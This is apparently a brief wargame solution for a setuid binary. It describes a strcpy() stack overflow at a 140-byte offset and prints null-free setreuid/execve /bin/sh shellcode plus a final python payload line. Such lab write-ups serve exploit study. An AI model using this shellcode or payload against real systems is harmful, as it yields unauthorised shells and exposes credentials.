1.) Buffer overflow with strcpy(), buffer size to write until return address is 140 bytes

2.) Write shellcode that has no null terminators, which sets the processes effective user id and executes a shell
    See shellcode/setreuid_exec_binsh.asm

3.) Exploit overflow w/ priv. esc and execve shell code and cat the password

Shell Code:
"\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xbe\x2f\x2f\x73\x68\xc1\xee\x08\x56\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"

Length: 40


Final Command:

`python -c "print('\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xbe\x2f\x2f\x73\x68\xc1\xee\x08\x56\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'A'*100 + '\xbf\xff\xfb\xb0'[::-1])"`
